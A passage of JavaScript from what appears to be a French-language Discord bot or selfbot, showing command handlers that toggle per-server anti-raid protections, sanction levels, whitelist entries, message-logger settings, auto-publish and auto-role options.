        else if (cmd.slice(0, 1).join(' ') === (prefix + "unwl")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!user || !args[0]) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez mentionner un utilisateur*`)
            if (!antiraid[message.guildId].whitelist.includes(user?.id)) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *${user.username} n'est pas whitelist*`)
            
            antiraid[message.guildId].whitelist = antiraid[message.guildId].whitelist.filter(id => id !== user?.id)
            
            client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
            message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *${user.username} n'est plus whitelist*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antichannel")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "on"){
                if (antiraid[message.guildId].antichannel === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La protection du serveur est déjà activé*`)
                antiraid[message.guildId].antichannel = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La protéction du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId] || !antiraid[message.guildId].antichannel) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La protection du serveur n'est pas activé*`)
                antiraid[message.guildId].antichannel = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La protéction du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antiban")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "on"){
                if (antiraid[message.guildId].antiban === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiban du serveur est déjà activé*`)
                antiraid[message.guildId].antiban = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiban du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antiban) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiban du serveur n'est pas activé*`)
                antiraid[message.guildId].antiban = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiban du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antikick")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antikick === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antikick du serveur est déjà activé*`)
                antiraid[message.guildId].antikick = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antikick du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antikick) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antikick du serveur n'est pas activé*`)
                antiraid[message.guildId].antikick = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antikick du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antibot")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antibot === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antibot du serveur est déjà activé*`)
                antiraid[message.guildId].antibot = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antibot du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antibot) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antibot du serveur n'est pas activé*`)
                antiraid[message.guildId].antibot = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antibot du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antirole")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antirole === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antirole du serveur est déjà activé*`)
                antiraid[message.guildId].antirole = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antirole du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antirole) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antirole du serveur n'est pas activé*`)
                antiraid[message.guildId].antirole = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antirole du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antiping")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antiping === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiping du serveur est déjà activé*`)
                antiraid[message.guildId].antiping = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiping du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antiping) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiping du serveur n'est pas activé*`)
                antiraid[message.guildId].antiping = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiping du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antispam")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antispam === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antispam du serveur est déjà activé*`)
                antiraid[message.guildId].antispam = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antispam du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antispam) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antispam du serveur n'est pas activé*`)
                antiraid[message.guildId].antispam = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antispam du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antilink")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antilink === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antilink du serveur est déjà activé*`)
                antiraid[message.guildId].antilink = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antilink du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antilink) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antilink du serveur n'est pas activé*`)
                antiraid[message.guildId].antilink = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antilink du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antiwebhook")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antiwebhook === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiwebhook du serveur est déjà activé*`)
                antiraid[message.guildId].antiwebhook = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiwebhook du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antiwebhook) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiwebhook du serveur n'est pas activé*`)
                antiraid[message.guildId].antiwebhook = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antiwebhook du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antidc")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antidc === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antidc du serveur est déjà activé*`)
                antiraid[message.guildId].antidc = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antidc du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antidc) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antidc du serveur n'est pas activé*`)
                antiraid[message.guildId].antidc = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'antidc du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antiguild")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antiguildupdate === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti guild update du serveur est déjà activé*`)
                antiraid[message.guildId].antiguildupdate = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti guild update du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antiguildupdate) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti guild update du serveur n'est pas activé*`)
                antiraid[message.guildId].antiguildupdate = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti guild update du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antimember")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "on"){
                if (antiraid[message.guildId].antimemberupdate === true) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti member update du serveur est déjà activé*`)
                antiraid[message.guildId].antimemberupdate = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti member update du serveur est maintenant activé*`)    
            }
            else if (args[0] === "off"){
                if (!antiraid[message.guildId].antimemberupdate) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti member update du serveur n'est pas activé*`)
                antiraid[message.guildId].antimemberupdate = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *L'anti member update du serveur est maintenant désactivé*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sanction")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            if (args[0] === "derank"){
                if (antiraid[message.guildId].sanction === 1) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La sanction est déjà un \`derank\`*`)
                antiraid[message.guildId].sanction = 1
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La sanction est maintenant un \`derank\`*`)    
            }
            else if (args[0] === "kick"){
                if (antiraid[message.guildId].sanction === 2) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La sanction est déjà un \`kick\`*`)
                antiraid[message.guildId].sanction = 2
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La sanction est maintenant un \`kick\`*`)    
            }
            else if (args[0] === "ban"){
                if (antiraid[message.guildId].sanction === 3) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La sanction est déjà un \`ban\`*`)
                antiraid[message.guildId].sanction = 3
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *La sanction est maintenant un \`ban\`*`)    
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "secur")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Anti Raid**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            

            function s(Number){
                switch(Number){
                    case 1: return "derank"
                    case 2: return "kick"
                    case 3: return "ban"
                }
            }

            if (!args[0]){
                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n>>> *Sanction* ${client.separator} \`${s(antiraid[message.guildId].sanction)}\`
                *Protégé* ${client.separator} \`${antiraid[message.guildId].protected ? "🟢" : "🔴"}\`
                *AntiChannel* ${client.separator} \`${antiraid[message.guildId].antichannel ? "🟢" : "🔴"}\`
                *AntiRole* ${client.separator} \`${antiraid[message.guildId].antirole ? "🟢" : "🔴"}\`
                *AntiKick* ${client.separator} \`${antiraid[message.guildId].antikick ? "🟢" : "🔴"}\`
                *AntiBan* ${client.separator} \`${antiraid[message.guildId].antiban ? "🟢" : "🔴"}\`
                *AntiBot* ${client.separator} \`${antiraid[message.guildId].antibot ? "🟢" : "🔴"}\`
                *AntiPing* ${client.separator} \`${antiraid[message.guildId].antiping ? "🟢" : "🔴"}\`
                *AntiWebhook* ${client.separator} \`${antiraid[message.guildId].antiwebhook ? "🟢" : "🔴"}\`
                *AntiLink* ${client.separator} \`${antiraid[message.guildId].antilink ? "🟢" : "🔴"}\`
                *AntiDC* ${client.separator} \`${antiraid[message.guildId].antidc ? "🟢" : "🔴"}\`
                *AntiSpam* ${client.separator} \`${antiraid[message.guildId].antispam ? "🟢" : "🔴"}\`
                *Anti Member Update* ${client.separator} \`${antiraid[message.guildId].antimemberupdate ? "🟢" : "🔴"}\`
                *Anti Guild Update* ${client.separator} \`${antiraid[message.guildId].antiguildupdate ? "🟢" : "🔴"}\``.replaceAll("                ", ""))
            }
            else if (args[0] === "on"){
                antiraid[message.guildId].protected = true
                antiraid[message.guildId].antichannel = true
                antiraid[message.guildId].antirole = true
                antiraid[message.guildId].antikick = true
                antiraid[message.guildId].antiban = true
                antiraid[message.guildId].antibot = true
                antiraid[message.guildId].antiping = true
                antiraid[message.guildId].antiwebhook = true
                antiraid[message.guildId].antilink = true
                antiraid[message.guildId].antidc = true
                antiraid[message.guildId].antispam = true
                antiraid[message.guildId].antimemberupdate = true
                antiraid[message.guildId].antiguildupdate = true
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)

                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n>>> *Sanction* ${client.separator} \`${s(antiraid[message.guildId].sanction)}\`
                *Protégé* ${client.separator} \`${antiraid[message.guildId].protected ? "🟢" : "🔴"}\`
                *AntiChannel* ${client.separator} \`${antiraid[message.guildId].antichannel ? "🟢" : "🔴"}\`
                *AntiRole* ${client.separator} \`${antiraid[message.guildId].antirole ? "🟢" : "🔴"}\`
                *AntiKick* ${client.separator} \`${antiraid[message.guildId].antikick ? "🟢" : "🔴"}\`
                *AntiBan* ${client.separator} \`${antiraid[message.guildId].antiban ? "🟢" : "🔴"}\`
                *AntiBot* ${client.separator} \`${antiraid[message.guildId].antibot ? "🟢" : "🔴"}\`
                *AntiPing* ${client.separator} \`${antiraid[message.guildId].antiping ? "🟢" : "🔴"}\`
                *AntiWebhook* ${client.separator} \`${antiraid[message.guildId].antiwebhook ? "🟢" : "🔴"}\`
                *AntiLink* ${client.separator} \`${antiraid[message.guildId].antilink ? "🟢" : "🔴"}\`
                *AntiDC* ${client.separator} \`${antiraid[message.guildId].antidc ? "🟢" : "🔴"}\`
                *AntiSpam* ${client.separator} \`${antiraid[message.guildId].antispam ? "🟢" : "🔴"}\`
                *Anti Member Update* ${client.separator} \`${antiraid[message.guildId].antimemberupdate ? "🟢" : "🔴"}\`
                *Anti Guild Update* ${client.separator} \`${antiraid[message.guildId].antiguildupdate ? "🟢" : "🔴"}\``.replaceAll("                ", ""))
            }
            else if (args[0] === "off"){
                antiraid[message.guildId].protected = false
                antiraid[message.guildId].antichannel = false
                antiraid[message.guildId].antirole = false
                antiraid[message.guildId].antikick = false
                antiraid[message.guildId].antiban = false
                antiraid[message.guildId].antibot = false
                antiraid[message.guildId].antiping = false
                antiraid[message.guildId].antiwebhook = false
                antiraid[message.guildId].antilink = false
                antiraid[message.guildId].antidc = false
                antiraid[message.guildId].antispam = false
                antiraid[message.guildId].antimemberupdate = false
                antiraid[message.guildId].antiguildupdate = false
                client.save(`${__dirname}/Data/AntiRaid/antiraid.json`, antiraid)

                message.edit(`ガ __**${name} - Anti Raid**__ ガ\n>>> *Sanction* ${client.separator} \`${s(antiraid[message.guildId].sanction)}\`
                *Protégé* ${client.separator} \`${antiraid[message.guildId].protected ? "🟢" : "🔴"}\`
                *AntiChannel* ${client.separator} \`${antiraid[message.guildId].antichannel ? "🟢" : "🔴"}\`
                *AntiRole* ${client.separator} \`${antiraid[message.guildId].antirole ? "🟢" : "🔴"}\`
                *AntiKick* ${client.separator} \`${antiraid[message.guildId].antikick ? "🟢" : "🔴"}\`
                *AntiBan* ${client.separator} \`${antiraid[message.guildId].antiban ? "🟢" : "🔴"}\`
                *AntiBot* ${client.separator} \`${antiraid[message.guildId].antibot ? "🟢" : "🔴"}\`
                *AntiPing* ${client.separator} \`${antiraid[message.guildId].antiping ? "🟢" : "🔴"}\`
                *AntiWebhook* ${client.separator} \`${antiraid[message.guildId].antiwebhook ? "🟢" : "🔴"}\`
                *AntiLink* ${client.separator} \`${antiraid[message.guildId].antilink ? "🟢" : "🔴"}\`
                *AntiDC* ${client.separator} \`${antiraid[message.guildId].antidc ? "🟢" : "🔴"}\`
                *AntiSpam* ${client.separator} \`${antiraid[message.guildId].antispam ? "🟢" : "🔴"}\`
                *Anti Member Update* ${client.separator} \`${antiraid[message.guildId].antimemberupdate ? "🟢" : "🔴"}\`
                *Anti Guild Update* ${client.separator} \`${antiraid[message.guildId].antiguildupdate ? "🟢" : "🔴"}\``.replaceAll("                ", ""))
            }
        }


        



























































        else if (cmd.slice(0, 1).join(' ') === (prefix + "setlogger")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (args[0] === "on"){
                if (logger.activate === true) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger est déjà activé*`)
                logger.activate = true
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger a été activé*`)
            }
            else if (args[0] === "off"){
                if (logger.activate === false) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger est déjà désactivé*`)
                logger.activate = false
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setwebhook")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (args[0] === "off"){
                if (logger.webhook === null) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le webhook est déjà supprimé*`)
                logger.webhook = null
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le webhook a été supprimé*`)
            }
            else if (args[0]?.startsWith("https://")) {
                const t = await fetch(args[0]).catch(() => false)
                if (t.status !== 200) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le webhook n'est pas valide*`);

                logger.webhook = args[0]
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le webhook a été modifié*`)
            }
        }

        else if (message.content === prefix + "logsetup"){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)
            if (!message.guild) return message.edit(`ガ __**${name} - Setup Logger**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_WEBHOOKS")) return message.edit(`ガ __**${name} - Setup Logger**__ ガ\n> *Vous n'avez pas les permissions nécessaires pour utiliser cette commande*`)
        
            const webhook = await message.channel.createWebhook("R$Z Logger")
            logger.webhook = webhook.url
            client.save(`${__dirname}/Data/Logger/logger.json`, logger)
            message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le webhook du logger a été crée et mis en place*`)
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setguild")){
            if (args[0] === "on"){
                if (logger.guild === true) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger guild est déjà active*`)
                logger.guild = true
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger guild a été activé*`)
            }

            if (args[0] === "off"){
                if (logger.guild === false) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger guild est déjà désactive*`)
                logger.guild = false
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger guild a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setdelete")){
            if (args[0] === "on"){
                if (logger.delete === true) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger delete est déjà active*`)
                logger.delete = true
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger delete a été activé*`)
            }

            if (args[0] === "off"){
                if (logger.delete === false) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger delete est déjà désactive*`)
                logger.delete = false
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger delete a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setedit")){
            if (args[0] === "on"){
                if (logger.edit === true) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger edit est déjà active*`)
                logger.edit = true
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger edit a été activé*`)
            }

            if (args[0] === "off"){
                if (logger.edit === false) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger edit est déjà désactive*`)
                logger.edit = false
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger edit a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setghostping")){
            if (args[0] === "on"){
                if (logger.ghostping === true) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger ghostping est déjà active*`)
                logger.ghostping = true
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger ghostping a été activé*`)
            }

            if (args[0] === "off"){
                if (logger.ghostping === false) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger ghostping est déjà désactive*`)
                logger.ghostping = false
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger ghostping a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sethypocrite")){
            if (args[0] === "on"){
                if (logger.hypocrite === true) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger hypocrite est déjà active*`)
                logger.hypocrite = true
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger hypocrite a été activé*`)
            }

            if (args[0] === "off"){
                if (logger.hypocrite === false) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger hypocrite est déjà désactive*`)
                logger.hypocrite = false
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger hypocrite a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "setgroups")){
            if (args[0] === "on"){
                if (logger.groups === true) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger groups est déjà active*`)
                logger.groups = true
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger groups a été activé*`)
            }

            if (args[0] === "off"){
                if (logger.groups === false) return message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger groups est déjà désactive*`)
                logger.groups = false
                client.save(`${__dirname}/Data/Logger/logger.json`, logger)
                message.edit(`ガ __**${name} - Logger**__ ガ\n> *Le logger groups a été désactivé*`)
            }
        }


        


































        else if (cmd.slice(0, 1).join(' ') === (prefix + "autopublish")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Auto Publish**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "on"){
                if (gestion[message.guildId].autopublish === true) return message.edit(`ガ __**${name} - Auto Publish**__ ガ\n> *L'auto publish est déjà activé*`)
                gestion[message.guildId].autopublish = true
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Auto Publish**__ ガ\n> *L'auto publish a été activé*`)
            }
            else if (args[0] === "off"){
                if (gestion[message.guildId].autopublish === false) return message.edit(`ガ __**${name} - Auto Publish**__ ガ\n> *L'auto publish est déjà désactivé*`)
                gestion[message.guildId].autopublish = false
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Auto Publish**__ ガ\n> *L'auto publish a été désactivé*`)
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "autorole")){
            if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

            if (!message.guild) return message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)

            if (args[0] === "add"){
                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
                if (!role || !args[1]) return message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *Veuillez mentionner un rôle*`)

                if (gestion[message.guildId].autorole.includes(role?.id)) return message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *${role} est déjà dans l'autorole*`)
                gestion[message.guildId].autorole.push(role?.id)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *${role} est maintenant dans l'auto role*`)
            }
            else if (args[0] === "remove"){
                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
                if (!role || !args[1]) return message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *Veuillez mentionner un rôle*`)

                if (!gestion[message.guildId].autorole.includes(role?.id)) return message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *${role} n'est pas dans l'autorole*`)
                gestion[message.guildId].autorole = gestion[message.guildId].autorole.filter(id => id !== role?.id)
                client.save(`${__dirname}/Data/Gestion/gestion.json`, gestion)
                message.edit(`ガ __**${name} - Auto Role**__ ガ\n> *${role} n'est plus dans l'auto role*`)
            }
